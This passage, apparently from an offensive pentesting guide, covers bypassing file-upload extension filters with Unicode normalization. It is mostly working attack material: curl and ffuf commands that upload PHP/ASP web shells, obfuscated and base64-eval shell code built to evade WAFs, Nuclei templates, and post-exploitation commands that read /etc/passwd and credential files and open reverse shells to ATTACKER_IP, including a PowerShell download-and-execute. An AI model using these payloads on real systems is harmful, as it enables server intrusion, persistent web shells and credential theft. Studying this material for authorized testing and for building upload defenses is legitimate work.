request = headers.encode('utf-8') + body_bytes

context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

sock = socket.create_connection((host, port))
ssock = context.wrap_socket(sock, server_hostname=host)
ssock.sendall(request)

response = b''
while True:
    data = ssock.recv(4096)
    if not data:
        break
    response += data

print(response.decode('utf-8', errors='replace'))
ssock.close()
```
::

---

## Advanced Bypass Techniques

::card-group
  :::card
  ---
  icon: i-lucide-combine
  title: Unicode + Double Extension
  ---
  Combine Unicode normalization with double extension techniques.

  ```bash
  # Fullwidth extension + safe trailing extension
  shell.ｐｈｐ.jpg
  shell.ⓟⓗⓟ.png
  shell.ｐｈｐ.gif
  shell.ⓟⓗⓟ.txt

  # Safe extension + fullwidth dangerous extension
  shell.jpg.ｐｈｐ
  shell.png.ⓟⓗⓟ
  shell.gif.ｐｈｐ
  ```

  ```bash
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.ｐｈｐ.jpg" \
    -v

  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.jpg.ⓟⓗⓟ" \
    -v
  ```
  :::

  :::card
  ---
  icon: i-lucide-binary
  title: Unicode + Null Byte
  ---
  Chain null byte injection with Unicode extension bypass.

  ```bash
  # Fullwidth extension + null byte + safe extension
  shell.ｐｈｐ%00.jpg
  shell.ⓟⓗⓟ%00.png
  shell.ｐｈｐ\x00.gif
  ```

  ```bash
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.ｐｈｐ%00.jpg" \
    -v

  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.ⓟⓗⓟ%00.png" \
    -v
  ```
  :::

  :::card
  ---
  icon: i-lucide-route
  title: Unicode Path Traversal
  ---
  Use fullwidth slashes and dots for path traversal during upload.

  ```bash
  # Fullwidth forward slash (U+FF0F) → "/"
  ．．／．．／．．／etc／passwd
  ..／..／..／etc／passwd

  # Fullwidth backslash (U+FF3C) → "\"
  ．．＼．．＼windows＼win.ini
  ..＼..＼windows＼win.ini

  # Mixed traversal + extension bypass
  ..／..／uploads／shell.ｐｈｐ
  ```

  ```bash
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=..／..／shell.ｐｈｐ" \
    -v

  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=..＼..＼shell.ⓟⓗⓟ" \
    -v
  ```
  :::

  :::card
  ---
  icon: i-lucide-type
  title: Unicode + Semicolon
  ---
  Combine Unicode extension with semicolon parsing bypass for IIS.

  ```bash
  shell.ａｓｐ;.jpg
  shell.ⓐⓢⓟ;.jpg
  shell.asp;.ｊｐｇ
  shell.ａｓｐ;.ⓙⓟ���
  ```

  ```bash
  curl -X POST https://target.com/upload \
    -F "file=@shell.asp;filename=shell.ａｓｐ;.jpg" \
    -v

  curl -X POST https://target.com/upload \
    -F "file=@shell.asp;filename=shell.ⓐⓢⓟ;.jpg" \
    -v
  ```
  :::

  :::card
  ---
  icon: i-lucide-space
  title: Unicode + Trailing Characters
  ---
  Append Unicode whitespace or control characters after the extension.

  ```bash
  # Zero-width space (U+200B) after extension
  shell.php​       # invisible zero-width space at end
  shell.ｐｈｐ​

  # Zero-width non-joiner (U+200C)
  shell.php‌

  # Zero-width joiner (U+200D)
  shell.php‍

  # Right-to-left override (U+202E) — visual filename reversal
  shell.‮php.jpg    # displays as shell.gpj.php visually
  ```

  ```bash
  # Zero-width space after extension
  printf 'shell.php\xe2\x80\x8b' > /tmp/fname.txt
  fname=$(cat /tmp/fname.txt)
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=${fname}" \
    -v
  ```
  :::

  :::card
  ---
  icon: i-lucide-flip-horizontal
  title: Right-to-Left Override (RTLO)
  ---
  Use the RTLO character (U+202E) to visually reverse the filename while keeping the actual extension dangerous.

  ```bash
  # Actual filename: shell[RTLO]gpj.php
  # Displayed as: shellphp.jpg (reversed visual)
  # But actual extension is still .php

  printf 'shell\xe2\x80\xaegpj.php' > /tmp/rtlo_fname.txt
  ```

  ```bash
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=$(cat /tmp/rtlo_fname.txt)" \
    -v
  ```

  ```python
  # Python RTLO filename generation
  rtlo = '\u202e'
  filename = f"shell{rtlo}gpj.php"
  # Visually: shellphp.jpg
  # Actually: shell[RTLO]gpj.php → parser sees .php
  ```
  :::
::

---

## Normalization Behavior per Platform

::warning{icon="i-lucide-alert-triangle"}
Normalization behavior varies significantly across platforms. Testing against the specific target stack is critical.
::

::tabs
  :::tabs-item{icon="i-lucide-server" label="Windows / NTFS"}
  ```bash
  # NTFS applies Unicode normalization to filenames
  # Fullwidth characters are normalized to ASCII equivalents

  # Test: Upload shell.ｐｈｐ → stored as shell.php on NTFS
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.ｐｈｐ" -v

  # Access with ASCII name
  curl "https://target.com/uploads/shell.php?cmd=whoami"

  # NTFS also strips trailing dots and spaces
  # shell.ｐｈｐ. → shell.php
  # shell.ｐｈｐ  → shell.php
  ```

  ```bash
  # Windows case-insensitive + normalization
  # All of these may resolve to the same file:
  curl "https://target.com/uploads/SHELL.PHP?cmd=whoami"
  curl "https://target.com/uploads/Shell.Php?cmd=whoami"
  curl "https://target.com/uploads/shell.php?cmd=whoami"
  ```
  :::

  :::tabs-item{icon="i-lucide-apple" label="macOS / HFS+ / APFS"}
  ```bash
  # HFS+ uses NFD normalization by default
  # APFS may or may not normalize depending on volume config

  # NFD decomposes accented characters:
  # é (U+00E9) → e + ́ (U+0065 + U+0301)

  # For extension bypass, NFKC/NFKD are more relevant
  # macOS Finder normalizes filenames on save

  # Test with accented extension characters
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.phṗ" -v
  # ṗ (U+1E57) contains a 'p' with dot above
  # NFD decomposes to p + combining dot above
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Linux / ext4"}
  ```bash
  # ext4 stores filenames as raw bytes — NO normalization
  # The application layer must normalize

  # This means:
  # shell.ｐｈｐ is stored as-is on disk
  # Normalization must happen in the application code

  # Check if application framework normalizes
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.ｐｈｐ" -v

  # Try accessing with both names
  curl -sI "https://target.com/uploads/shell.ｐｈｐ"
  curl -sI "https://target.com/uploads/shell.php"

  # If shell.php returns 200 but shell.ｐｈｐ returns 404:
  # → Application normalized before saving
  # If shell.ｐｈｐ returns 200 but shell.php returns 404:
  # → No normalization, file stored with Unicode name
  ```
  :::

  :::tabs-item{icon="i-lucide-coffee" label="Java / Spring"}
  ```bash
  # Java's java.text.Normalizer class
  # Spring may normalize path variables and request parameters

  # Test if Java backend normalizes uploaded filenames
  curl -X POST https://target.com/api/upload \
    -F "file=@shell.jsp;filename=shell.ⓙⓢⓟ" \
    -H "Cookie: JSESSIONID=YOUR_SESSION" -v

  # Spring MVC path normalization
  curl "https://target.com/uploads/shell.ⓙⓢⓟ"
  curl "https://target.com/uploads/shell.jsp"
  ```

  ```java
  // How Java normalizes:
  // import java.text.Normalizer;
  // String normalized = Normalizer.normalize("shell.ⓙⓢⓟ", Normalizer.Form.NFKC);
  // Result: "shell.jsp"
  ```
  :::

  :::tabs-item{icon="i-lucide-hexagon" label="Node.js / Express"}
  ```bash
  # Node.js String.prototype.normalize()
  # Express does NOT normalize by default
  # But middleware or the application may call .normalize()

  curl -X POST https://target.com/api/upload \
    -F "file=@shell.js;filename=shell.ⓙⓢ" -v

  # If application uses filename.normalize('NFKC'):
  # shell.ⓙⓢ → shell.js
  ```

  ```javascript
  // Node.js normalization test
  const fname = "shell.\u24D9\u24E2\u24DF"; // shell.ⓙⓢⓟ
  console.log(fname.normalize('NFKC')); // shell.jsp
  console.log(fname.normalize('NFC'));   // shell.ⓙⓢⓟ (unchanged)
  ```
  :::

  :::tabs-item{icon="i-lucide-gem" label="Python / Django / Flask"}
  ```bash
  # Python unicodedata.normalize()
  # Django may normalize filenames in FileField/ImageField

  curl -X POST https://target.com/upload/ \
    -F "file=@shell.py;filename=shell.ⓟⓨ" \
    -H "X-CSRFToken: TOKEN" \
    -H "Cookie: csrftoken=TOKEN; sessionid=SESSION" -v
  ```

  ```python
  # Python normalization test
  import unicodedata
  fname = "shell.\u24df\u24d7\u24df"  # shell.ⓟⓗⓟ
  print(unicodedata.normalize('NFKC', fname))  # shell.php
  print(unicodedata.normalize('NFC', fname))   # shell.ⓟⓗⓟ
  ```
  :::
::

---

## Comprehensive Filename Wordlist Generation

::code-group
```python [generate_unicode_wordlist.py]
#!/usr/bin/env python3
"""Generate comprehensive Unicode normalization bypass filename wordlist"""

import unicodedata
import itertools
import sys

# Character substitution maps (char → list of Unicode equivalents)
SUBSTITUTIONS = {
    'a': ['\uff41', '\u24d0', '\u1d43', '\u2090'],
    'b': ['\uff42', '\u24d1', '\u1d47'],
    'c': ['\uff43', '\u24d2', '\u1d9c'],
    'd': ['\uff44', '\u24d3', '\u1d48'],
    'e': ['\uff45', '\u24d4', '\u2091', '\u1d49'],
    'f': ['\uff46', '\u24d5', '\u1da0'],
    'g': ['\uff47', '\u24d6', '\u1d4d'],
    'h': ['\uff48', '\u24d7', '\u02b0'],
    'i': ['\uff49', '\u24d8', '\u2071'],
    'j': ['\uff4a', '\u24d9', '\u02b2'],
    'k': ['\uff4b', '\u24da', '\u1d4f'],
    'l': ['\uff4c', '\u24db', '\u02e1'],
    'm': ['\uff4d', '\u24dc', '\u1d50'],
    'n': ['\uff4e', '\u24dd', '\u207f'],
    'o': ['\uff4f', '\u24de', '\u2092', '\u1d52'],
    'p': ['\uff50', '\u24df', '\u1d56', '\u209a'],
    'q': ['\uff51', '\u24e0'],
    'r': ['\uff52', '\u24e1', '\u02b3'],
    's': ['\uff53', '\u24e2', '\u02e2', '\u209b'],
    't': ['\uff54', '\u24e3', '\u1d57'],
    'u': ['\uff55', '\u24e4', '\u1d58'],
    'v': ['\uff56', '\u24e5', '\u1d5b'],
    'w': ['\uff57', '\u24e6', '\u02b7'],
    'x': ['\uff58', '\u24e7', '\u02e3'],
    'y': ['\uff59', '\u24e8'],
    'z': ['\uff5a', '\u24e9'],
    '.': ['\uff0e', '\ufe52', '\u2024'],
}

DANGEROUS_EXTENSIONS = [
    'php', 'php5', 'php7', 'phtml', 'phar', 'pht',
    'asp', 'aspx', 'ashx', 'asmx',
    'jsp', 'jspx', 'jspa', 'jspf',
    'cfm', 'cfc', 'cfml',
    'py', 'pl', 'cgi', 'rb', 'erb',
    'svg', 'html', 'htm', 'xhtml',
    'config', 'htaccess',
]

def generate_single_sub(ext):
    """Generate variants with single character substitution"""
    variants = set()
    for i, char in enumerate(ext):
        if char in SUBSTITUTIONS:
            for sub in SUBSTITUTIONS[char]:
                variant = ext[:i] + sub + ext[i+1:]
                variants.add(variant)
    return variants

def generate_full_sub(ext):
    """Generate full substitution variants"""
    variants = set()
    
    # All fullwidth
    fw = ''.join(SUBSTITUTIONS.get(c, [c])[0] if c in SUBSTITUTIONS else c for c in ext)
    variants.add(fw)
    
    # All circled (if available)
    circled = ''
    for c in ext:
        if c in SUBSTITUTIONS and len(SUBSTITUTIONS[c]) > 1:
            circled += SUBSTITUTIONS[c][1]
        elif c in SUBSTITUTIONS:
            circled += SUBSTITUTIONS[c][0]
        else:
            circled += c
    variants.add(circled)
    
    return variants

def generate_partial_subs(ext, max_combinations=50):
    """Generate partial substitution combinations"""
    variants = set()
    chars = list(ext)
    
    # Two-character substitutions
    indices = [i for i, c in enumerate(chars) if c in SUBSTITUTIONS]
    for combo in itertools.combinations(indices, min(2, len(indices))):
        for sub_types in itertools.product(*[range(len(SUBSTITUTIONS[chars[i]])) for i in combo]):
            new = list(chars)
            for idx, sub_idx in zip(combo, sub_types):
                new[idx] = SUBSTITUTIONS[chars[idx]][sub_idx]
            variants.add(''.join(new))
            if len(variants) >= max_combinations:
                return variants
    
    return variants

output_file = sys.argv[1] if len(sys.argv) > 1 else "unicode_filenames.txt"

with open(output_file, 'w', encoding='utf-8') as f:
    total = 0
    for ext in DANGEROUS_EXTENSIONS:
        all_variants = set()
        all_variants.update(generate_single_sub(ext))
        all_variants.update(generate_full_sub(ext))
        all_variants.update(generate_partial_subs(ext))
        
        # Add dot variants
        dot_variants = set()
        for variant in list(all_variants):
            for dot in SUBSTITUTIONS.get('.', []):
                dot_variants.add(f"shell{dot}{variant}")
            dot_variants.add(f"shell.{variant}")
        
        for v in dot_variants:
            nfkc = unicodedata.normalize('NFKC', v)
            f.write(f"{v}\n")
            total += 1
    
    print(f"[*] Generated {total} filenames -> {output_file}")
```

```bash [quick_wordlist.sh]
#!/bin/bash
# Quick wordlist generation using echo with Unicode chars

OUTFILE="${1:-unicode_extensions.txt}"

cat > "$OUTFILE" << 'EOF'
shell.ｐｈｐ
shell.ⓟⓗⓟ
shell.ⓟhp
shell.phⓟ
shell.pⓗp
shell.ｐhp
shell.phｐ
shell.pｈp
shell.ⓟｈⓟ
shell.ｐⓗｐ
shell.ᵖʰᵖ
shell.ₚhₚ
shell．ｐｈｐ
shell．ⓟⓗⓟ
shell.ａｓｐ
shell.ⓐⓢⓟ
shell.ⓐsp
shell.aⓢp
shell.asⓟ
shell.ａsp
shell.aｓp
shell.asｐ
shell.ａｓｐｘ
shell.ⓐⓢⓟⓧ
shell.ⓐspx
shell.aspⓧ
shell.aspｘ
shell.ｊｓｐ
shell.ⓙⓢⓟ
shell.ⓙsp
shell.jⓢp
shell.jsⓟ
shell.ｊsp
shell.jｓp
shell.jsｐ
shell.ｊｓｐｘ
shell.ⓙⓢⓟⓧ
shell.ｐｈｔｍｌ
shell.ⓟⓗⓣⓜⓛ
shell.ｐｈａｒ
shell.ⓟⓗⓐⓡ
shell.ｐｈｐ5
shell.ⓟⓗⓟ5
shell.ｃｆｍ
shell.ⓒⓕⓜ
shell.ⓢⓥⓖ
shell.ｓｖｇ
shell.ⓗⓣⓜⓛ
shell.ｈｔｍｌ
shell.ｃｏｎｆｉｇ
.ⓗⓣⓐⓒⓒⓔⓢ��
.ｈｔａｃｃｅｓｓ
shell.ｐｈｐ.jpg
shell.ⓟⓗⓟ.png
shell.jpg.ｐｈｐ
shell.png.ⓟⓗⓟ
shell.ｐｈｐ%00.jpg
shell.ⓟⓗⓟ%00.png
shell.ａｓｐ;.jpg
shell.ⓐⓢⓟ;.jpg
EOF

echo "[*] Generated $(wc -l < "$OUTFILE") filenames -> $OUTFILE"
```
::

---

## Automated Scanning with ffuf

::tabs
  :::tabs-item{icon="i-lucide-zap" label="Fuzz Upload Filenames"}
  ```bash
  # Generate the wordlist first
  python3 generate_unicode_wordlist.py unicode_filenames.txt

  # Fuzz upload endpoint with Unicode filenames
  ffuf -u https://target.com/upload \
    -X POST \
    -H "Cookie: session=YOUR_SESSION" \
    -H "Content-Type: multipart/form-data; boundary=----Bound" \
    -d '------Bound\r\nContent-Disposition: form-data; name="file"; filename="FUZZ"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo shell_exec($_GET["cmd"]); ?>\r\n------Bound--' \
    -w unicode_filenames.txt \
    -mc 200,201 \
    -fc 400,403,415,422
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="Fuzz Uploaded File Paths"}
  ```bash
  # After upload, search for normalized filenames
  ffuf -u https://target.com/FUZZ/shell.php \
    -w /usr/share/seclists/Discovery/Web-Content/common.txt \
    -mc 200 \
    -t 50

  # Also try with Unicode names still intact
  ffuf -u https://target.com/uploads/FUZZ \
    -w unicode_filenames.txt \
    -mc 200 \
    -t 50
  ```
  :::

  :::tabs-item{icon="i-lucide-refresh-cw" label="Batch Upload and Verify"}
  ```bash
  # Upload all variants and immediately try to access
  while IFS= read -r fname; do
    # Upload
    upload_status=$(curl -s -o /tmp/upload_resp.txt -w "%{http_code}" \
      -X POST https://target.com/upload \
      -F "file=@shell.php;filename=${fname}" \
      -H "Cookie: session=YOUR_SESSION")
    
    if [ "$upload_status" = "200" ] || [ "$upload_status" = "201" ]; then
      echo "[UPLOADED] ${fname} (HTTP ${upload_status})"
      
      # Try to access with original name
      for dir in uploads upload files images media; do
        access_status=$(curl -s -o /dev/null -w "%{http_code}" \
          "https://target.com/${dir}/${fname}?cmd=whoami" --max-time 3)
        if [ "$access_status" = "200" ]; then
          echo "  [EXEC] https://target.com/${dir}/${fname}"
        fi
        
        # Try NFKC normalized name
        normalized=$(python3 -c "import unicodedata; print(unicodedata.normalize('NFKC', '${fname}'))" 2>/dev/null)
        if [ -n "$normalized" ] && [ "$normalized" != "$fname" ]; then
          access_status=$(curl -s -o /dev/null -w "%{http_code}" \
            "https://target.com/${dir}/${normalized}?cmd=whoami" --max-time 3)
          if [ "$access_status" = "200" ]; then
            echo "  [EXEC-NORMALIZED] https://target.com/${dir}/${normalized}"
          fi
        fi
      done
    fi
  done < unicode_filenames.txt
  ```
  :::
::

---

## Nuclei Templates

::code-collapse
```yaml [unicode-normalization-upload.yaml]
id: unicode-normalization-upload-bypass

info:
  name: File Upload - Unicode Normalization Extension Bypass
  author: pentester
  severity: critical
  description: Tests file upload bypass using Unicode character normalization to evade extension filters
  tags: upload,bypass,unicode,normalization,rce

variables:
  marker: "{{rand_base(6)}}"

http:
  - raw:
      - |
        POST {{BaseURL}}/upload HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----NucleiUnicode{{marker}}

        ------NucleiUnicode{{marker}}
        Content-Disposition: form-data; name="file"; filename="test_{{marker}}.ｐｈｐ"
        Content-Type: application/octet-stream

        <?php echo "NUCLEI_UNICODE_{{marker}}"; ?>
        ------NucleiUnicode{{marker}}--

      - |
        GET {{BaseURL}}/uploads/test_{{marker}}.php HTTP/1.1
        Host: {{Hostname}}

      - |
        GET {{BaseURL}}/uploads/test_{{marker}}.ｐｈｐ HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: or
    matchers:
      - type: word
        part: body_2
        words:
          - "NUCLEI_UNICODE_{{marker}}"

      - type: word
        part: body_3
        words:
          - "NUCLEI_UNICODE_{{marker}}"

    extractors:
      - type: regex
        part: header_1
        regex:
          - "(?i)(location|path|url|file)[\"\\s:=]+([^\"'\\s>]+)"
```

```yaml [unicode-normalization-multi.yaml]
id: unicode-normalization-multi-extension

info:
  name: File Upload - Unicode Multi Extension Bypass
  author: pentester
  severity: critical
  tags: upload,bypass,unicode

http:
  - raw:
      - |
        POST {{BaseURL}}/upload HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----Bound

        ------Bound
        Content-Disposition: form-data; name="file"; filename="test.§filename§"
        Content-Type: application/octet-stream

        <?php echo "UNICODE_BYPASS_TEST"; ?>
        ------Bound--

    attack: sniper
    payloads:
      filename:
        - "ｐｈｐ"
        - "ⓟⓗⓟ"
        - "ⓟhp"
        - "phⓟ"
        - "pⓗp"
        - "ｐhp"
        - "phｐ"
        - "pｈp"
        - "ⓟｈⓟ"
        - "ｐⓗｐ"
        - "ａｓｐ"
        - "ⓐⓢⓟ"
        - "ｊｓｐ"
        - "ⓙⓢⓟ"
        - "ａｓｐｘ"
        - "ⓐⓢⓟⓧ"
        - "ｐｈｔｍｌ"
        - "ⓟⓗⓣⓜⓛ"
        - "ｐｈａｒ"
        - "ⓟⓗⓐⓡ"

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201

      - type: word
        part: body
        words:
          - "error"
          - "invalid"
          - "not allowed"
          - "rejected"
          - "forbidden"
          - "extension"
        negative: true
        condition: and
```
::

```bash
# Run single template
nuclei -t unicode-normalization-upload.yaml -u https://target.com -v

# Run multi-vector template
nuclei -t unicode-normalization-multi.yaml -u https://target.com -v

# Run against target list
nuclei -t unicode-normalization-upload.yaml -l targets.txt -c 25 -v -o results.txt

# Run with authentication header
nuclei -t unicode-normalization-upload.yaml -u https://target.com \
  -H "Cookie: session=YOUR_SESSION" -v
```

---

## WAF Bypass Strategies

::accordion
  :::accordion-item{icon="i-lucide-shield-off" label="Chunked Transfer + Unicode"}
  ```bash
  # Use chunked encoding to split the Unicode filename across chunks
  curl -X POST https://target.com/upload \
    -H "Transfer-Encoding: chunked" \
    -H "Content-Type: multipart/form-data; boundary=----Bound" \
    --data-binary @- << 'EOF'
  ------Bound
  Content-Disposition: form-data; name="file"; filename="shell.ⓟⓗⓟ"
  Content-Type: application/octet-stream

  <?php echo shell_exec($_GET["cmd"]); ?>
  ------Bound--
  EOF
  ```
  :::

  :::accordion-item{icon="i-lucide-layers" label="Double URL Encoding + Unicode"}
  ```bash
  # Double URL-encode the Unicode bytes
  # ⓟ = E2 93 9F → %E2%93%9F → %25E2%2593%259F (double encoded)

  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.%25E2%2593%259F%25E2%2593%2597%25E2%2593%259F" \
    -v
  ```

  ```bash
  # Mix Unicode with URL encoding
  # Fullwidth p = EF BD 90
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.%EF%BD%90h%EF%BD%90" \
    -v
  ```
  :::

  :::accordion-item{icon="i-lucide-file-text" label="Content-Disposition Manipulation"}
  ```bash
  # Filename in different encoding declaration
  curl -X POST https://target.com/upload \
    -H "Content-Type: multipart/form-data; boundary=----Bound" \
    --data-binary $'------Bound\r\nContent-Disposition: form-data; name="file"; filename*=UTF-8\'\'shell.%E2%93%9F%E2%93%97%E2%93%9F\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo shell_exec($_GET["cmd"]); ?>\r\n------Bound--'
  ```

  ```bash
  # Double Content-Disposition with different filenames
  curl -X POST https://target.com/upload \
    -H "Content-Type: multipart/form-data; boundary=----Bound" \
    --data-binary $'------Bound\r\nContent-Disposition: form-data; name="file"; filename="safe.jpg"\r\nContent-Disposition: form-data; name="file"; filename="shell.ⓟⓗⓟ"\r\nContent-Type: image/jpeg\r\n\r\n<?php echo shell_exec($_GET["cmd"]); ?>\r\n------Bound--'
  ```
  :::

  :::accordion-item{icon="i-lucide-split" label="Multipart Boundary Tricks"}
  ```bash
  # Unusual boundary to confuse WAF parsers
  curl -X POST https://target.com/upload \
    -H "Content-Type: multipart/form-data; boundary=--UnicodeBound\xef\xbb\xbf" \
    --data-binary $'----UnicodeBound\xef\xbb\xbf\r\nContent-Disposition: form-data; name="file"; filename="shell.ⓟⓗⓟ"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo shell_exec($_GET["cmd"]); ?>\r\n----UnicodeBound\xef\xbb\xbf--'
  ```

  ```bash
  # BOM (Byte Order Mark) in boundary
  curl -X POST https://target.com/upload \
    -H "Content-Type: multipart/form-data; boundary=\xef\xbb\xbfBound" \
    --data-binary $'\xef\xbb\xbfBound\r\nContent-Disposition: form-data; name="file"; filename="shell.ⓟⓗⓟ"\r\nContent-Type: application/octet-stream\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n\xef\xbb\xbfBound--'
  ```
  :::

  :::accordion-item{icon="i-lucide-text-cursor-input" label="Payload Obfuscation in Shell"}
  ```php
  <?php
  // Obfuscated shell — avoids WAF pattern matching
  $a = "syst";
  $b = "em";
  $f = $a.$b;
  $f($_GET["\x63\x6d\x64"]); // "cmd" in hex
  ?>
  ```

  ```php
  <?php
  // Base64-decoded execution
  eval(base64_decode('c3lzdGVtKCRfR0VUWyJjbWQiXSk7'));
  // Decodes to: system($_GET["cmd"]);
  ?>
  ```

  ```php
  <?php
  // Variable function with Unicode-normalized variable name
  ${'sys'.'tem'}($_GET['cmd']);
  ?>
  ```
  :::
::

---

## Post-Exploitation

::tabs
  :::tabs-item{icon="i-lucide-check-circle" label="Verify Execution"}
  ```bash
  # Try both Unicode and normalized filenames
  curl "https://target.com/uploads/shell.php?cmd=whoami"
  curl "https://target.com/uploads/shell.ⓟⓗⓟ?cmd=whoami"
  curl "https://target.com/uploads/shell.ｐｈｐ?cmd=whoami"
  ```

  ```bash
  # System enumeration
  curl "https://target.com/uploads/shell.php?cmd=id"
  curl "https://target.com/uploads/shell.php?cmd=uname+-a"
  curl "https://target.com/uploads/shell.php?cmd=cat+/etc/passwd"
  curl "https://target.com/uploads/shell.php?cmd=env"
  curl "https://target.com/uploads/shell.php?cmd=ls+-la+/var/www/"
  ```
  :::

  :::tabs-item{icon="i-lucide-radio" label="Reverse Shell"}
  ```bash
  # Start listener
  nc -lvnp 4444
  ```

  ```bash
  # Trigger reverse shell (Linux)
  curl "https://target.com/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
  ```

  ```bash
  # Trigger reverse shell (Windows)
  curl "https://target.com/uploads/shell.asp?cmd=powershell+-nop+-c+\"IEX(IWR+http://ATTACKER_IP/rev.ps1)\""
  ```

  ```bash
  # Python reverse shell
  curl "https://target.com/uploads/shell.php?cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
  ```
  :::

  :::tabs-item{icon="i-lucide-database" label="Data Extraction"}
  ```bash
  # Database credentials
  curl "https://target.com/uploads/shell.php?cmd=cat+/var/www/html/config.php"
  curl "https://target.com/uploads/shell.php?cmd=cat+/var/www/html/.env"
  curl "https://target.com/uploads/shell.php?cmd=grep+-r+password+/var/www/html/+--include='*.php'+2>/dev/null+|+head+-20"
  ```

  ```bash
  # Windows equivalent
  curl "https://target.com/uploads/shell.asp?cmd=type+C:\\inetpub\\wwwroot\\web.config"
  curl "https://target.com/uploads/shell.asp?cmd=findstr+/si+password+C:\\inetpub\\wwwroot\\*.config"
  ```
  :::
::

---

## Request Flow Diagram

::code-preview
```
┌──────────────────────────────────────────────────────────────┐
│                        ATTACKER                              │
│                                                              │
│  Filename: shell.ⓟⓗⓟ  (U+24DF U+24D7 U+24DF)              │
│  Content: <?php system($_GET["cmd"]); ?>                     │
│  Goal: Bypass extension blacklist via Unicode normalization   │
└──────────────────┬───────────────────────────────────────────┘
                   │
                   ▼
┌──────────────────────────────────────────────────────────────┐
│                UPLOAD VALIDATION LAYER                       │
│                                                              │
│  1. Extracts filename: shell.ⓟⓗⓟ                            │
│  2. Splits on "." → extension = "ⓟⓗⓟ"                       │
│  3. Blacklist check: "ⓟⓗⓟ" ≠ "php" → NOT BLOCKED           │
│  4. Whitelist check: "ⓟⓗⓟ" unknown → may PASS              │
│  5. Content-Type: application/octet-stream → PASS            │
│  6. Result: UPLOAD ALLOWED ✓                                 │
└──────────────────┬───────────────────────────────────────────┘
                   │
                   ▼
┌──────────────────────────────────────────────────────────────┐
│              NORMALIZATION LAYER                             │
│         (Framework / OS / File System)                        │
│                                                              │
│  NFKC Normalization Applied:                                 │
│    ⓟ (U+24DF) → p                                           │
│    ⓗ (U+24D7) → h                                           │
│    ⓟ (U+24DF) → p                                           │
│                                                              │
│  Filename transformed: shell.ⓟⓗⓟ → shell.php               │
└──────────────────┬───────────────────────────────────────────┘
                   │
                   ▼
┌──────────────────────────────────────────────────────────────┐
│                FILE SYSTEM STORAGE                           │
│                                                              │
│  Stored as: /uploads/shell.php                               │
│  Extension: .php                                             │
│  Executable: YES                                             │
└──────────────────┬───────────────────────────────────────────┘
                   │
                   ▼
┌──────────────────────────────────────────────────────────────┐
│                WEB SERVER EXECUTION                          │
│                                                              │
│  Request: GET /uploads/shell.php?cmd=id                      │
│  Handler: PHP interpreter                                    │
│  Result: uid=33(www-data) gid=33(www-data)                   │
│                                                              │
│  REMOTE CODE EXECUTION ACHIEVED                              │
└──────────────────────────────────────────────────────────────┘
```

#code
```
Attacker → Upload shell.ⓟⓗⓟ → Filter sees "ⓟⓗⓟ" ≠ "php" → ALLOWED
→ NFKC normalizes ⓟⓗⓟ → php → Stored as shell.php → CODE EXECUTION
```
::

---

## Normalization Comparison Matrix

::collapsible

| Input Filename | NFC Result | NFD Result | NFKC Result | NFKD Result | Bypass? |
| --- | --- | --- | --- | --- | --- |
| `shell.ｐｈｐ` | `shell.ｐｈｐ` | `shell.ｐｈｐ` | `shell.php` | `shell.php` | Yes (NFKC/NFKD) |
| `shell.ⓟⓗⓟ` | `shell.ⓟⓗⓟ` | `shell.ⓟⓗⓟ` | `shell.php` | `shell.php` | Yes (NFKC/NFKD) |
| `shell.ᵖʰᵖ` | `shell.ᵖʰᵖ` | `shell.ᵖʰᵖ` | `shell.php` | `shell.php` | Yes (NFKC/NFKD) |
| `shell.Php` | `shell.Php` | `shell.Php` | `shell.Php` | `shell.Php` | No (case only) |
| `shell.ａｓｐ` | `shell.ａｓｐ` | `shell.ａｓｐ` | `shell.asp` | `shell.asp` | Yes (NFKC/NFKD) |
| `shell.ⓐⓢⓟ` | `shell.ⓐⓢⓟ` | `shell.ⓐⓢⓟ` | `shell.asp` | `shell.asp` | Yes (NFKC/NFKD) |
| `shell.ｊｓｐ` | `shell.ｊｓｐ` | `shell.ｊｓｐ` | `shell.jsp` | `shell.jsp` | Yes (NFKC/NFKD) |
| `shell.ⓙⓢⓟ` | `shell.ⓙⓢⓟ` | `shell.ⓙⓢⓟ` | `shell.jsp` | `shell.jsp` | Yes (NFKC/NFKD) |
| `shell．ⓟⓗⓟ` | `shell．ⓟⓗⓟ` | `shell．ⓟⓗⓟ` | `shell.php` | `shell.php` | Yes (dot + ext) |
| `..／etc／passwd` | `..／etc／passwd` | `..／etc／passwd` | `../etc/passwd` | `../etc/passwd` | Yes (path traversal) |
| `..＼windows＼win.ini` | `..＼windows＼win.ini` | `..＼windows＼win.ini` | `..\windows\win.ini` | `..\windows\win.ini` | Yes (path traversal) |

::

---

## Quick Reference

::card-group
  :::card
  ---
  icon: i-lucide-zap
  title: Fastest PoC
  ---
  ```bash
  # Create payload
